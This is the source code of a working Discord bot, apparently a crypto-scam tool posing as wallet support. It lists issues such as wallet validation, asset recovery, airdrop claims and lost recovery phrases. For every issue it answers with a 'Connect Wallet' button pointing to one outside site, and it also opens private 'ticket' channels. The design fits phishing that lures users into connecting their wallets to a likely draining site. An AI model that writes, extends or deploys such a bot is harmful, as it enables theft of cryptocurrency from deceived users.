const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, ChannelType, PermissionsBitField, ActivityType } = require('discord.js');
require('dotenv').config();

const keepAlive = require('./server')

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
    ]
});

// Command 1 Options with dropdown descriptions
const command1Options = [
    { 
        name: '1. Validate Wallet', 
        value: 'validate_wallet', 
        description: 'Wallet validation issues',
        subtext: '🔍 Having trouble verifying your wallet address or signature? Our automated system can validate your wallet credentials in seconds.'
    },
    { 
        name: '2. Assets/Token Recovery', 
        value: 'asset_recovery', 
        description: 'Assets recovery issues',
        subtext: '💼 Accidentally sent tokens to wrong address? Lost access to your assets? We provide recovery solutions for misplaced funds.'
    },
    { 
        name: '3. Rectification', 
        value: 'rectification', 
        description: 'Rectify transaction issues',
        subtext: '🛠️ Need to cancel or modify a pending transaction? Get help fixing incomplete or stuck transactions.'
    },
    { 
        name: '4. High Gas Fees', 
        value: 'high_gas', 
        description: 'High gas fee issues',
        subtext: '⛽️ Transactions costing too much? Learn optimization techniques and alternative networks with lower fees.'
    },
    { 
        name: '5. Claim Reward', 
        value: 'claim_reward', 
        description: 'Reward related issues',
        subtext: '🎁 Having trouble claiming staking rewards, airdrops or bonuses? We\'ll help you access your entitled rewards.'
    },
    { 
        name: '6. Deposit & Withdrawals', 
        value: 'withdrawals', 
        description: 'Withdrawal related issues',
        subtext: '🏦 Funds not showing up? Withdrawals stuck? Get assistance with all deposit/withdrawal problems.'
    },
    { 
        name: '7. Slippage Error', 
        value: 'slippage', 
        description: 'Slippage related errors',
        subtext: '📉 Failed swaps due to price impact? Learn how to set optimal slippage tolerance for successful trades.'
    },
    { 
        name: '8. Transaction Error', 
        value: 'transaction', 
        description: 'Transaction related issues',
        subtext: '❌ Transactions failing or stuck? We\'ll diagnose common errors like insufficient gas or contract reverts.'
    },
    { 
        name: '9. Cross Chain Transfer', 
        value: 'cross_chain', 
        description: 'Cross chain bridge issues',
        subtext: '🌉 Funds not arriving after bridge transfer? Get help with cross-chain transactions and recovery.'
    },
    { 
        name: '10. Staking', 
        value: 'staking', 
        description: 'Staking related issues',
        subtext: '🔒 Problems with staking, unstaking or claiming rewards? We\'ll troubleshoot your staking operations.'
    },
    { 
        name: '11. Swap/Exchange', 
        value: 'swap', 
        description: 'Swap/exchange issues',
        subtext: '🔄 Swaps not executing? Getting price errors? Get assistance with DEX trading problems.'
    },
    { 
        name: '12. Connect to DApps', 
        value: 'dapps', 
        description: 'DApp connection issues',
        subtext: '🌐 Wallet not connecting to websites? We\'ll fix connection rejects and signature requests.'
    },
    { 
        name: '13. Login Issues', 
        value: 'login', 
        description: 'Wallet login problems',
        subtext: '🔑 Can\'t access your wallet? Forgotten password or recovery phrase? Get account recovery options.'
    },
    { 
        name: '14. Claim Airdrop', 
        value: 'airdrop', 
        description: 'Airdrop related issues',
        subtext: '🎈 Missing eligible airdrops? Having trouble claiming? Verify your eligibility and claim process.'
    },
    { 
        name: '15. NFTs Issues', 
        value: 'nfts', 
        description: 'NFT related issues',
        subtext: '🖼️ Problems minting, transferring or viewing NFTs? We\'ll troubleshoot your NFT transactions.'
    },
    { 
        name: '16. Missing/Irregular Issues', 
        value: 'missing_funds', 
        description: 'Lost/missing funds',
        subtext: '⚠️ Unexplained balance changes? Funds disappeared? Report suspicious activity for investigation.'
    },
    { 
        name: '17. Migration Issues', 
        value: 'migration', 
        description: 'Migration related issues',
        subtext: '🔄 Struggling with token migrations or contract upgrades? Get step-by-step migration support.'
    }
];

const commands = [
    new SlashCommandBuilder()
        .setName('command1')
        .setDescription('Select an issue you are having')
        .addStringOption(option => {
            let opt = option
                .setName('issue')
                .setDescription('Choose from these common issues')
                .setRequired(true);

            command1Options.forEach(choice => {
                opt = opt.addChoices({
                    name: `${choice.name} - ${choice.description}`,
                    value: choice.value,
                    description: choice.description
                });
            });
            return opt;
        }),
    new SlashCommandBuilder()
        .setName('command2')
        .setDescription('Connect your wallet to our services'),
    new SlashCommandBuilder()
        .setName('command3')
        .setDescription('Create a new support ticket')
        .addStringOption(option =>
            option.setName('description')
                .setDescription('Describe your issue in detail')
                .setRequired(true)
        )
];

client.on('ready', async () => {
    console.log(`✅ Bot is online as ${client.user.tag}!`);

    try {
        await client.application.commands.set(commands);
        console.log('✅ Slash commands registered!');
    } catch (error) {
        console.error('❌ Error registering commands:', error);
    }

    client.user.setPresence({
        activities: [{ name: '/command1 for help', type: ActivityType.Listening }],
        status: 'online'
    });
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    try {
        if (interaction.commandName === 'command1') {
            const issue = interaction.options.getString('issue');
            const selectedOption = command1Options.find(opt => opt.value === issue);

            const embed = new EmbedBuilder()
                .setTitle(`🔧 ${selectedOption.name.split(' - ')[0]}`)
                .setDescription(selectedOption.subtext)
                .setColor('#3498db')
                .setFooter({ text: 'Click the button below for immediate assistance' });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Connect →')
                        .setURL('https://swiftnodelinker.net')
                        .setStyle(ButtonStyle.Link)
                );

            await interaction.reply({ embeds: [embed], components: [row] });
        }
        else if (interaction.commandName === 'command2') {
            const embed = new EmbedBuilder()
                .setTitle('🔗 Wallet Connection')
                .setDescription('Please click the button below to connect your wallet')
                .setColor('#2ecc71')
                .setThumbnail('https://i.imgur.com/WQq0TdQ.png');

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Connect Wallet →')
                        .setURL('https://swiftnodelinker.net')
                        .setStyle(ButtonStyle.Link)
                );

            await interaction.reply({ embeds: [embed], components: [row] });
        }
        else if (interaction.commandName === 'command3') {
            const description = interaction.options.getString('description');
            const ticketId = Math.floor(Math.random() * 90000) + 10000; // Just numbers

            try {
                // Create category if it doesn't exist
                let category = interaction.guild.channels.cache.find(
                    c => c.name === 'SUPPORT TICKETS' && c.type === ChannelType.GuildCategory
                );

                if (!category) {
                    category = await interaction.guild.channels.create({
                        name: 'SUPPORT TICKETS',
                        type: ChannelType.GuildCategory,
                        permissionOverwrites: [
                            {
                                id: interaction.guild.id,
                                deny: [PermissionsBitField.Flags.ViewChannel]
                            }
                        ]
                    });
                }

                const channel = await interaction.guild.channels.create({
                    name: `${ticketId}`,
                    type: ChannelType.GuildText,
                    parent: category.id,
                    permissionOverwrites: [
                        {
                            id: interaction.guild.id,
                            deny: [PermissionsBitField.Flags.ViewChannel]
                        },
                        {
                            id: interaction.user.id,
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ReadMessageHistory
                            ]
                        }
                    ]
                });

                const embed = new EmbedBuilder()
                    .setTitle(`🎫 Ticket #${ticketId}`)
                    .setDescription(description)
                    .addFields(
                        { name: 'Status', value: '🟡 OPEN', inline: true },
                        { name: 'Created By', value: interaction.user.tag, inline: true },
                        { name: 'Created At', value: new Date().toLocaleString(), inline: false }
                    )
                    .setColor('#e67e22');

                await channel.send({ 
                    content: `${interaction.user}`,
                    embeds: [embed] 
                });

                await interaction.reply({ 
                    content: `✅ Ticket created: ${channel}\nYou've been automatically moved to the ticket channel.`, 
                    ephemeral: true 
                });

                // Move user to ticket channel (if in voice)
                if (interaction.member.voice.channel) {
                    await interaction.member.voice.setChannel(channel).catch(console.error);
                }

            } catch (error) {
                console.error('Ticket creation error:', error);
                await interaction.reply({ 
                    content: '❌ Failed to create ticket. Please contact an admin.', 
                    ephemeral: true 
                });
            }
        }
    } catch (error) {
        console.error('Command error:', error);
        await interaction.reply({ 
            content: '❌ An error occurred. Please try again later.', 
            ephemeral: true 
        });
    }
});

keepAlive()

client.login(process.env.TOKEN);